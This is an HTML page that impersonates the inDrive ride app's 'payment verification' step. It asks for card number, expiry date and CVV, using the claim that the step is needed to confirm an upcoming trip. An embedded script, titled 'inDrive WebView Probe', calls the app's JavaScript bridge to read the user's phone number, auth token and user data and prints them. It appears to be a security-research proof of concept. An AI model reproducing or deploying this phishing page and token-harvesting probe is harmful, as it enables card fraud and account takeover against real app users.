<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>inDrive - Payment Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: sans-serif;
      background: #fffef3;
      color: #000;
      margin: 0;
      padding: 0;
    }
    .header {
      padding: 16px;
      text-align: center;
    }
    .header img {
      height: 40px;
    }
    .container {
      padding: 20px;
      max-width: 400px;
      margin: 0 auto;
    }
    h1 {
      font-size: 20px;
      margin: 0 0 10px;
      text-align: center;
    }
    form {
      display: flex;
      flex-direction: column;
    }
    label {
      margin: 10px 0 5px;
      font-weight: bold;
    }
    input {
      padding: 12px;
      font-size: 16px;
      border: 2px solid #ccc;
      border-radius: 6px;
    }
    button {
      margin-top: 20px;
      padding: 14px;
      font-size: 16px;
      background-color: #d9ff00;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
    }
    .footer {
      margin-top: 30px;
      font-size: 12px;
      color: #666;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="header">
    <img src="https://indrive.com/images/logo/logo--dark.svg" alt="inDrive">
  </div>
  <div class="container">
    <h1>Verify your payment method</h1>
    <form action="indriver://open/driver/wallet">
      <label for="card">Card Number</label>
      <input type="text" id="card" placeholder="1234 5678 9012 3456">

      <label for="exp">Expiration Date</label>
      <input type="text" id="exp" placeholder="MM / YY">

      <label for="cvv">CVV</label>
      <input type="text" id="cvv" placeholder="123">

      <button type="submit">Verify Card</button>
    </form>
    <div class="footer">
      This step is required to confirm your upcoming trip.
    </div>

    <script>
  const results = [];

  try {
    if (typeof inDrive !== "undefined") {
      results.push("[+] Found 'inDrive' object.");

      try {
        results.push("getPhoneNumber(): " + inDrive.getPhoneNumber());
      } catch (e) {
        results.push("[-] getPhoneNumber() failed: " + e);
      }

      try {
        results.push("getAuthToken(): " + inDrive.getAuthToken());
      } catch (e) {
        results.push("[-] getAuthToken() failed: " + e);
      }

      try {
        results.push("getUserData(): " + inDrive.getUserData());
      } catch (e) {
        results.push("[-] getUserData() failed: " + e);
      }
    } else {
      results.push("[-] 'inDrive' object not found.");
    }
  } catch (e) {
    results.push("[!] Exception during probing: " + e);
  }

  document.write("<h2 style='font-family:sans-serif;'>inDrive WebView Probe</h2><pre style='background:#f0f0f0;padding:1em;border-radius:6px;'>" + results.join("<br>") + "</pre>");
</script>

  </div>
</body>
</html>
